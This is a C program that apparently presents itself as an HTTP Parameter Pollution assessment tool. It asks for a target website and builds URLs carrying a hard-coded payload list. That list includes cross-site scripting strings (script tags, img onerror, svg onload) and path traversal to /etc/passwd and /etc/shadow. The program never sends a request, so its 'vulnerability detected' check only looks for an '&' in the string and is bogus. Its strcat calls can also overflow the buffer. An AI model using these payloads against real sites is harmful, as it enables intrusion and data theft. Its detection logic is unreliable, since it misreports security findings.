#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_URL_LENGTH 1024
#define MAX_PARAM_LENGTH 256
#define MAX_PAYLOAD_LENGTH 512
#define MAX_PAYLOADS 20

// Payloads for HTTP Parameter Pollution attack
const char *payloads[MAX_PAYLOADS] = {
    "param3=malicious_value",
    "param3=evil_value",
    "param3=;param4=hijacked_value",
    "param1=another_malicious_value&param2=another_evil_value",
    "param4=<script>alert('XSS')</script>",
    "param5=../../etc/passwd",
    "param6=../../../etc/shadow",
    "param7=%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E",
    "param8=<img src=x onerror=alert('XSS')>",
    "param9=<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "param10=%3Csvg/onload=alert('XSS')%3E",
    "param11=eval('alert(\"XSS\")')",
    "param12=<body onload=alert('XSS')>",
    "param13=<svg><script>alert('XSS')</script></svg>",
    // Add more payloads here as needed
};

// ANSI escape codes for text colors
#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_RESET   "\x1b[0m"

// Function to attach payloads to the given URL
void attach_payloads(const char *url) {
    char target_url[MAX_URL_LENGTH];
    char param[MAX_PARAM_LENGTH];
    char payload[MAX_PAYLOAD_LENGTH];

    strcpy(target_url, url);

    // Iterate over payloads
    for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
        strcpy(payload, payloads[i]);

        // Tokenize the payload to extract parameter and value
        char *token = strtok(payload, "=");
        strcpy(param, token);

        // Check if the parameter already exists in the URL
        if (strstr(target_url, param) != NULL) {
            // If parameter exists, append the payload with "&"
            strcat(target_url, "&");
        } else {
            // If parameter doesn't exist, append the payload with "?"
            strcat(target_url, "?");
        }

        // Append the payload to the URL
        strcat(target_url, payloads[i]);

        // Print the manipulated URL with the payload
        printf("Polluted URL %d: %s\n", i + 1, target_url);

        // Check for vulnerability
        if (strstr(target_url, "&") != NULL || strstr(target_url, "?&") != NULL) {
            // Print a message indicating vulnerability detected
            printf(ANSI_COLOR_RED "Vulnerability detected!\n" ANSI_COLOR_RESET);
        } else {
            // Print a message indicating no vulnerability detected
            printf(ANSI_COLOR_GREEN "No vulnerability detected.\n" ANSI_COLOR_RESET);
        }

        // Reset target URL for the next iteration
        strcpy(target_url, url);
    }
}

int main() {
    char target_url[MAX_URL_LENGTH];

    // Prompt the user to enter the target website link
    printf("Enter your target website link: ");
    scanf("%1023s", target_url); // Read up to 1023 characters to prevent buffer overflow

    // Print a message indicating the start of the program
    printf("Starting HTTP Parameter Pollution assessment...\n");

    // Attach payloads to the given target URL and check for vulnerability
    attach_payloads(target_url);

    // Print a message indicating the end of the program
    printf("HTTP Parameter Pollution assessment completed.\n");

    return 0;
}
